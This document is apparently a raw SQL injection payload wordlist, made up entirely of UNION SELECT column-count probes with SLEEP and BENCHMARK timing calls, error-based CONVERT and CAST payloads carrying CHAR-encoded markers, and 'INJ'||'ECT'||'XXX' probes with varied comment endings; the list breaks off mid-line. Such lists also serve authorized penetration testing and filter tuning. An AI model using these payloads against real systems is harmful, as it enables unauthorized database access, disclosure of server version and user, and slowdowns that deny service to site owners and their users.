SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n UNION ALL SELECT USER()-- \n UNION ALL SELECT SLEEP(5)-- \n UNION ALL SELECT USER(),SLEEP(5)-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT NULL-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- \n UNION ALL SELECT NULL#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#\n UNION ALL SELECT NULL \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\n AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\n AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)\n AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\n UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX'\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX'#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#\n UNION ALL SELECT 